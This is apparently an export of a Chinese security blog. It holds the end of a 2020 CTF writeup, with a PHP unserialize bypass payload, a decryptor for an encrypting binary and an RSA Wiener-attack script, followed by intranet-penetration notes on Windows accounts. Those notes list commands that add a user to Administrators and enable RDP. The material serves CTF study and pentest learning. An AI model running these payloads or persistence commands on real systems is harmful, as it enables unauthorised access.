class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;trick1 = (<span class="keyword">string</span>)<span class="keyword">$this</span>-&gt;trick1;</span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;trick1) &gt; <span class="number">5</span> || strlen(<span class="keyword">$this</span>-&gt;trick2) &gt; <span class="number">5</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;你太长了&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;trick1 !== <span class="keyword">$this</span>-&gt;trick2 &amp;&amp; md5(<span class="keyword">$this</span>-&gt;trick1) === md5(<span class="keyword">$this</span>-&gt;trick2) &amp;&amp; <span class="keyword">$this</span>-&gt;trick1 != <span class="keyword">$this</span>-&gt;trick2)&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">unserialize($_GET[<span class="string">&#x27;trick&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>可以用<code>NAN</code>和<code>INF</code>绕过，如图：</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821134126.png"></p><p>构造poc：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">trick</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $trick1;</span><br><span class="line">    <span class="keyword">public</span> $trick2;</span><br><span class="line">&#125; </span><br><span class="line">$a=<span class="keyword">new</span> trick();</span><br><span class="line">$a-&gt;trick1=<span class="string">&#x27;NAN&#x27;</span>;</span><br><span class="line">$a-&gt;trick2=NAN;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>等到各个地区助力完成后就会给出flag</p><h3 id="the-best-ctf-game"><a href="#the-best-ctf-game" class="headerlink" title="the_best_ctf_game"></a>the_best_ctf_game</h3><p>hxd打开可以明显看到flag字样</p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ截图20200821111411.png" style="zoom: 80%;"><p>并且中间隔的都是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 00 0C 00 00 00 E0 FF FF FF B0 FF FF FF 00 00 00 00</span><br></pre></td></tr></table></figure><p>直接全局替换成空得到flag</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821111629.png"></p><h3 id="电脑被黑"><a href="#电脑被黑" class="headerlink" title="电脑被黑"></a>电脑被黑</h3><p>binwalk分离出</p><p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ%E6%88%AA%E5%9B%BE20200821151353.png"></p><p>demo用ida64打开得到</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v4; <span class="comment">// [rsp+1Dh] [rbp-13h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [rsp+1Eh] [rbp-12h]</span></span><br><span class="line">  <span class="keyword">char</span> v6; <span class="comment">// [rsp+1Fh] [rbp-11h]</span></span><br><span class="line">  FILE *v7; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = <span class="number">34</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  v7 = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(argv[<span class="number">1</span>], <span class="string">&quot;rb+&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v6 = fgetc(v7);</span><br><span class="line">        <span class="keyword">if</span> ( v6 == <span class="number">-1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        fputc(v4 ^ (v5 + v6), stream);</span><br><span class="line">        v4 += <span class="number">34</span>;</span><br><span class="line">        v5 = (v5 + <span class="number">2</span>) &amp; <span class="number">0xF</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      fclose(v7);</span><br><span class="line">      fclose(stream);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;cannot open file&quot;</span>, <span class="string">&quot;rb+&quot;</span>, argv);</span><br><span class="line">      result = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;cannot open this file&quot;</span>, <span class="string">&quot;rb&quot;</span>, argv);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目提示误删数据，用extundelete恢复删除的数据得到flag.txt</p><img src="/2020/08/25/%E5%9B%BD%E8%B5%9B2020%E5%88%9D%E8%B5%9B-wp/QQ截图20200821155557.png" style="zoom:80%;"><p>逆一下算法，exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">v4=<span class="number">34</span></span><br><span class="line">v5=<span class="number">0</span></span><br><span class="line">v7=open(<span class="string">&quot;flag.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"><span class="keyword">for</span> v6 <span class="keyword">in</span> v7:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;trueflag.txt&quot;</span>,<span class="string">&quot;ab+&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        <span class="comment"># print(str(v6))</span></span><br><span class="line">        a=((int(str(v6))^v4)-v5)%<span class="number">256</span></span><br><span class="line">        <span class="keyword">if</span> a==<span class="number">-1</span>:</span><br><span class="line">            v4=<span class="number">34</span></span><br><span class="line">            v5=<span class="number">0</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        print(chr(a),end=<span class="string">&quot;&quot;</span>)</span><br><span class="line">    v4+=<span class="number">34</span>;</span><br><span class="line">    v5=(v5+<span class="number">2</span>) &amp; <span class="number">0xf</span></span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bd"><a href="#bd" class="headerlink" title="bd"></a>bd</h3><p>RSA中的维纳攻击，脚本地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;pablocelayes&#x2F;rsa-wiener-attack</span><br></pre></td></tr></table></figure><p>通过维纳攻击计算出d，然后解密就行，脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> a2b_hex</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span>(<span class="params">e,n</span>):</span></span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Finds d knowing (e,n)</span></span><br><span class="line"><span class="string">    applying the Wiener continued fraction attack</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    frac = ContinuedFractions.rational_to_contfrac(e, n)</span><br><span class="line">    convergents = ContinuedFractions.convergents_from_contfrac(frac)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = Arithmetic.is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">&quot;Hacked!&quot;</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">c=<span class="number">37625098109081701774571613785279343908814425141123915351527903477451570893536663171806089364574293449414561630485312247061686191366669404389142347972565020570877175992098033759403318443705791866939363061966538210758611679849037990315161035649389943256526167843576617469134413191950908582922902210791377220066</span></span><br><span class="line">e=<span class="number">46867417013414476511855705167486515292101865210840925173161828985833867821644239088991107524584028941183216735115986313719966458608881689802377181633111389920813814350964315420422257050287517851213109465823444767895817372377616723406116946259672358254060231210263961445286931270444042869857616609048537240249</span></span><br><span class="line">N=<span class="number">86966590627372918010571457840724456774194080910694231109811773050866217415975647358784246153710824794652840306389428729923771431340699346354646708396564203957270393882105042714920060055401541794748437242707186192941546185666953574082803056612193004258064074902605834799171191314001030749992715155125694272289</span></span><br><span class="line">d=hack_RSA(e,N)</span><br><span class="line">m=pow(c,d,N)</span><br><span class="line">flag=a2b_hex(hex(m).replace(<span class="string">&#x27;0x&#x27;</span>,<span class="string">&#x27;&#x27;</span>)).decode()</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h2 id><a href="#" class="headerlink" title></a></h2>]]></content>
      
      
      
        <tags>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>内网渗透初探之Windows基础</title>
      <link href="2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/"/>
      <url>2020/06/24/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F1/</url>
      
        <content type="html"><![CDATA[<p>记一下，忘了方便看！！！</p><a id="more"></a><h2 id="Windows用户和用户组"><a href="#Windows用户和用户组" class="headerlink" title="Windows用户和用户组"></a>Windows用户和用户组</h2><h3 id="常见用户"><a href="#常见用户" class="headerlink" title="常见用户"></a>常见用户</h3><h4 id="Administrator"><a href="#Administrator" class="headerlink" title="Administrator"></a>Administrator</h4><p>系统管理员，计算机的管理员账户拥有对全系统的控制权，能改变系统设置，可以安装和删除程序，能访问计算机上所有的文件。除此之外，它还拥有控制其他用户的权限。Windows7中至少要有一个计算机管理员账户。在只有一个计算机管理员账户的情况下，该账户不能将自己改成受限制账户。</p><h4 id="User"><a href="#User" class="headerlink" title="User"></a>User</h4><p>标准用户账户是受到一定限制的账户，在系统中可以创建多个此类账户，也可以改变其账户类型。该账户可以访问已经安装在计算机上的程序，可以设置自己账户的图片、密码等，但无权更改大多数计算机的设置。</p><h4 id="System"><a href="#System" class="headerlink" title="System"></a>System</h4><p>SYSTEM是系统保留拥有最高权限的超级管理员帐户。默认情况下，我们无法直接在登录对话框上以SYSTEM帐户的身份登录到Windows桌面环境。</p><h3 id="用户组"><a href="#用户组" class="headerlink" title="用户组"></a>用户组</h3><h4 id="基本用户组"><a href="#基本用户组" class="headerlink" title="基本用户组"></a>基本用户组</h4><p><strong>Administrators</strong></p><p>　　属于该administators本地组内的用户，都具备系统管理员的权限，它们拥有对这台计算机最大的控制权限，可以执行整台计算机的管理任务。内置的系统管理员账号Administrator就是本地组的成员，而且无法将它从该组删除。</p><p>　　如果这台计算机已加入域，则域的Domain Admins会自动地加入到该计算机的Administrators组内。也就是说，域上的系统管理员在这台计算机上也具备着系统管理员的权限。</p><p><strong>Backup OPerators</strong></p><p>　　在该组内的成员，不论它们是否有权访问这台计算机中的文件夹或文件，都可以通过“开始”－“所有程序”－“附件”－“系统工具”－“备份”的途径，备份与还原这些文件夹与文件。</p><p><strong>Guests</strong></p><p>　　该组是提供没有用户帐户，但是需要访问本地计算机内资源的用户使用，该组的成员无法永久地改变其桌面的工作环境。该组最常见的默认成员为用户帐号Guest。</p><p><strong>Network Configuration Operators</strong></p><p>　　该组内的用户可以在客户端执行一般的网络设置任务，例如更改IP地址，但是不可以安装/删除驱动程序与服务，也不可以执行与网络服务器设置有关的任务，例如DNS服务器、DHCP服务器的设置。</p><p><strong>Power Users</strong></p><p>　　该组内的用户具备比Users组更多的权利，但是比Administrators组拥有的权利更少一些，例如，可以：</p><p>　　创建、删除、更改本地用户帐户</p><p>　　创建、删除、管理本地计算机内的共享文件夹与共享打印机</p><p>　　自定义系统设置，例如更改计算机时间、关闭计算机等</p><p>　　但是不可以更改Administrators与Backup Operators、无法夺取文件的所有权、无法备份与还原文件、无法安装删除与删除设备驱动程序、无法管理安全与审核日志。</p><p><strong>Remote Desktop Users</strong></p><p>　　该组的成员可以通过远程计算机登录，例如，利用终端服务器从远程计算机登录。</p><p><strong>Users</strong></p><p>　　该组员只拥有一些基本的权利，例如运行应用程序，但是他们不能修改操作系统的设置、不能更改其它用户的数据、不能关闭服务器级的计算机。</p><p>　　所有添加的本地用户帐户者自动属于该组。如果这台计算机已经加入域，则域的Domain Users会自动地被加入到该计算机的Users组中。</p><p><strong>SYSTEM</strong></p><p>​        拥有和Administrators一样、甚至比其还高的权限，但是这个组不允许任何用户的加入，在察看用户组的时候，它也不会被显示出来，它就是SYSTEM组。系统和系统级的服务正常运行所需要的权限都是靠它赋予的。由于该组只有这一个用户SYSTEM，可以理解成linux的root用户</p><h4 id="内置特殊组"><a href="#内置特殊组" class="headerlink" title="内置特殊组"></a>内置特殊组</h4><p><strong>Everone</strong></p><p>　　任何一个用户都属于这个组。注意，如果Guest帐号被启用时，则给Everone这个组指派权限时必须小心，因为当一个没有帐户的用户连接计算机时，他被允许自动利用Guest帐户连接，但是因为Guest也是属于Everone组，所以他将具备Everyone所拥有的权限。</p><p><strong>Authenticated Users</strong></p><p>　　任何一个利用有效的用户帐户连接的用户都属于这个组。建议在设置权限时，尽量针对Authenticated Users组进行设置，而不要针对Everone进行设置。</p><p><strong>Interactive</strong></p><p>　　任何在本地登录的用户都属于这个组。</p><p><strong>Network</strong></p><p>　　任何通过网络连接此计算机的用户都属于这个组。</p><p><strong>Creator Owner</strong></p><p>　　文件夹、文件或打印文件等资源的创建者，就是该资源的Creator Owner（创建所有者）。不过，如果创建者是属于Administrators组内的成员，则其Creator Owner为Administrators组。</p><p><strong>Anonymous Logon</strong></p><p>　　任何未利用有效的Windows Server 2003帐户连接的用户，都属于这个组。注意，在windows 2003内，Everone 组内并不包含“Anonymous Logon”组</p><h3 id="SID"><a href="#SID" class="headerlink" title="SID"></a>SID</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>SID也就是安全标识符（Security Identifiers），是标识用户、组和计算机帐户的唯一的号码。在第一次创建该帐户时，将给网络上的每一个帐户发布一个唯一的 SID。Windows 2000 中的内部进程将引用帐户的 SID 而不是帐户的用户或组名。如果创建帐户，再删除帐户，然后使用相同的用户名创建另一个帐户，则新帐户将不具有授权给前一个帐户的权力或权限，原因是该帐户具有不同的 SID 号。安全标识符也被称为安全 ID 或 SID。</p><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>用户通过验证后，登陆进程会给用户一个访问令牌，该令牌相当于用户访问系统资源的票证，当用户试图访问系统资源时，将访问令牌提供给 Windows NT，然后 Windows NT 检查用户试图访问对象上的访问控制列表。如果用户被允许访问该对象，Windows NT将会分配给用户适当的访问权限。</p><p>访问令牌是用户在通过验证的时候有登陆进程所提供的，所以改变用户的权限需要注销后重新登陆，重新获取访问令牌。</p><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><p>如果存在两个同样SID的用户，这两个帐户将被鉴别为同一个帐户，原理上如果帐户无限制增加的时候，会产生同样的SID，在通常的情况下SID是唯一的，他由计算机名、当前时间、当前用户态线程的CPU耗费时间的总和三个参数决定以保证它的唯一性。</p><p>一个完整的SID包括：</p><ul><li>用户和组的安全描述</li><li>48-bit的ID authority</li><li>修订版本</li><li>可变的验证值Variable sub-authority values</li></ul><p>例：<code>S-1-5-21-310440588-250036847-580389505-500</code></p><p>我们来先分析这个重要的SID。第一项S表示该字符串是SID；第二项是SID的版本号，对于2000来说，这个就是1；然后是标志符的颁发机构（identifier authority），对于2000内的帐户，颁发机构就是NT，值是5。然后表示一系列的子颁发机构，前面几项是标志域的，最后一个标志着域内的帐户和组。</p><h4 id="SID的获得"><a href="#SID的获得" class="headerlink" title="SID的获得"></a>SID的获得</h4><p>开始－运行－regedt32－<code>HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Builtin\Aliases\Members</code>，找到本地的域的代码，展开后，得到的就是本地帐号的所有SID列表。</p><p>其中很多值都是固定的，比如第一个000001F4（16进制），换算成十进制是500，说明是系统建立的内置管理员帐号administrator，000001F5换算成10进制是501，也就是GUEST帐号了，详细的参照后面的列表。</p><p>这一项默认是system可以完全控制，这也就是为什么要获得这个需要一个System的Cmd的Shell的原因了，当然如果权限足够的话你可以把你要添加的帐号添加进去。</p><p>或者使用Support Tools的Reg工具：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList</span><br></pre></td></tr></table></figure><p>还有一种方法可以获得SID和用户名称的对应关系：</p><ol><li>Regedt32:<br><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion \ProfileList</code></li><li>这个时候可以在左侧的窗口看到SID的值，可以在右侧的窗口中ProfileImagePath看到不同的SID关联的用户名，<br>比如<code>%SystemDrive%\Documents and Settings\Administrator.momo</code>这个对应的就是本地机器的管理员SID<br><code>%SystemDrive%\Documents and Settings\Administrator.domain</code>这个就是对应域的管理员的帐户</li></ol><p>另外微软的ResourceKit里面也提供了工具getsid，sysinternals的工具包里面也有Psgetsid，其实感觉原理都是读取注册表的值罢了，就是省了一些事情。</p><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">net user# 查看用户</span><br><span class="line">net user Administrator# 查看administrator用户详细信息</span><br><span class="line">net user moonback 1314 /add# 添加用户名moonback密码为1314的用户，需要管理员权限(注意密码复杂度)</span><br><span class="line">net user moonback /delete# 删除moonback用户</span><br><span class="line">net user moonback /active:no# 禁用moonback用户</span><br><span class="line">net user moonback /active:yes# 启用moonback用户</span><br><span class="line">net user moonback /passwordchg:yes# 用户moonback可以改变密码</span><br><span class="line">net user moonback /passwordreq:yes# 用户moonback必须拥有密码</span><br><span class="line">net user moonback /expires:never# 用户moonback永不过期</span><br><span class="line">net localgroup# 查看用户组</span><br><span class="line">net localgroup Administrators# 查看管理员组成员</span><br><span class="line">net localgroup Administrators moonback /del # 将moonback用户从管理员组删除</span><br><span class="line">net localgroup Administrators moonback /add # 将moonback用户添加到管理员组</span><br><span class="line">net localgroup hack /add # 添加hack用户组</span><br><span class="line">whoami /user# 查看SID</span><br><span class="line">query user# 查看在线用户</span><br><span class="line">tasklist# 查看进程</span><br><span class="line">tasklist /svc# 查看进程及对应的pid和服务</span><br><span class="line">tasklist /svc | findstr &quot;TeamService.exe&quot;# 查看远程桌面进程</span><br><span class="line">taskkill /f /im pid# 强制杀死pid号进程</span><br><span class="line">netstat -ano# 显示网络信息</span><br><span class="line">netstat -ano | findstr &quot;3389&quot;# 查看3389端口状态</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f  # 开启3389</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f  # 关闭3389</span><br><span class="line">REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber</span><br><span class="line"><span class="meta">#</span><span class="bash"> 查看远程桌面端口</span></span><br><span class="line">ver# 查看系统版本，5.1=&gt;2003 5.2=&gt;xp 6.1=&gt;win7、2008 6.2=&gt;win8、2012 10=&gt;win10</span><br><span class="line">systeminfo# 查看windows详细信息</span><br></pre></td></tr></table></figure><h2 id="Windows认证及密码"><a href="#Windows认证及密码" class="headerlink" title="Windows认证及密码"></a>Windows认证及密码</h2><h2 id="Windows防护方案"><a href="#Windows防护方案" class="headerlink" title="Windows防护方案"></a>Windows防护方案</h2><h3 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h3><p>Windows Vista 开始引入了 UAC(User Account Control，用户账户控制)，最直观的表现是当应用试图安装软件或更改计算机、或者更改了 Windows 设置时将弹出 UAC 提示框。</p><p>从 Windows Vista 开始，进程在创建的时候，可以得到一个访问令牌（Access Token），这个令牌有四个完整性级别：</p><ul><li>System（系统）</li><li>High（高）</li><li>Medium（中）</li><li>Low（低）</li></ul><p>System 令牌是对系统完全操作的令牌，对应 SYSTEM 用户拥有的最高权限，可以对 Windows 操作系统做任何事。通常一个服务进程会以 SYSTEM 用户启动，拿到 System 令牌。</p><p>High 对应 Administrators 组拥有的最高权限，也就是前面所说的 Administrator 用户和用户自己创建的管理员账户的权限级别。此权限级别用来管理计算机，可以修改其他用户，可以修改系统的设置，这些设置可能会造成安全问题（比如更改系统时间可能导致杀毒软件失效）。</p><p>Medium 对应 Users 组拥有的最高权限，也就是前面所说的用户自己创建的标准用户。此权限级别用来日常使用。Medium 权限在 Windows Vista（实际上是其内核 NT6）中相比于之前版本的 Windows 有一些权限的提升，不危及系统安全性的操作在 Medium 下即可以完成，不需要切换到 High 级别。Users 组的用户是没有 High 和 System 令牌的，程序在此用户账户下，无论如何也无法拿到 High 和 System 令牌的，因为这个用户没有这样的令牌；如果要权限提升，需要输入管理员账号密码，而这时拿到的是这个管理员账号的 High 和 System 令牌。</p><p>Low 并不对应者一个用户组，这是为了一些需要特殊保护的应用程序准备的。有些应用容易受到攻击，那么使用 Low 令牌启动这些应用程序，可以最大程度减少利用这些应用对系统造成攻击。比如 IE 浏览器的页面进程使用 Low 令牌运行，其对系统很难做出什么改动，甚至也影响不了当前用户的文件；当需要需系统计算机进行交互的时候，会与 IE 的 UI 进程（Medium 令牌）进行通信，请求协助完成。</p><p>当 UAC 是开启状态，无论是管理员账户还是标准账户，Windows 资源管理器进程（explorer.exe）都是以 Medium 令牌启动进程。由于子进程通常能够继承父进程的令牌完整性级别，所以这样的设定可以防止用户双击打开的程序得到过高的令牌，从而在用户不知情的情况下危及系统安全。</p><h3 id="ASR"><a href="#ASR" class="headerlink" title="ASR"></a>ASR</h3><h3 id="Applocker"><a href="#Applocker" class="headerlink" title="Applocker"></a>Applocker</h3><h2 id="域和工作组"><a href="#域和工作组" class="headerlink" title="域和工作组"></a>域和工作组</h2><h3 id="工作组"><a href="#工作组" class="headerlink" title="工作组"></a>工作组</h3><p>所有的计算机都是对等的，没有计算机可以控制另一台计算机。</p><p>每台计算机都具有一组用户帐户。若要登录到工作组中的任何计算机，您必须具有该计算机上的帐户。</p><p>通常情况下，计算机的数量不超过二十台。工作组不受密码保护。所有的计算机必须在同一本地网络或子网中。</p><h3 id="域"><a href="#域" class="headerlink" title="域"></a>域</h3><p>有一台或多台计算机为服务器。网络管理员使用服务器控制域中所有计算机的安全和权限。这使得更容易进行更改，因为更改会自动应用到所有的计算机。域用户在每次访问域时必须提供密码或其他凭据。</p><p>如果具有域上的用户帐户，您就可以登录到域中的任何计算机，而无需具有该计算机上的帐户。</p><p>由于网络管理员经常要确保计算机之间的一致性，所以，只能对计算机的设置进行有限制地更改。</p><p>一个域中可以有几千台计算机。计算机可以位于不同的本地网络中。</p><p>域是由域控制器(Domain Controller)和成员计算机组成，域控制器就是安装了活动 目录(Active Directory)的计算机。活动目录提供了存储网络上对象信息并使用网络使用该数据的方法。</p><h4 id="内网常用命令"><a href="#内网常用命令" class="headerlink" title="内网常用命令"></a>内网常用命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">将Windows Server Core 加入到域</span></span><br><span class="line">netdom renamecomputer FileServer /newname:ProfileServer #更改计算机名称为ProfileServer</span><br><span 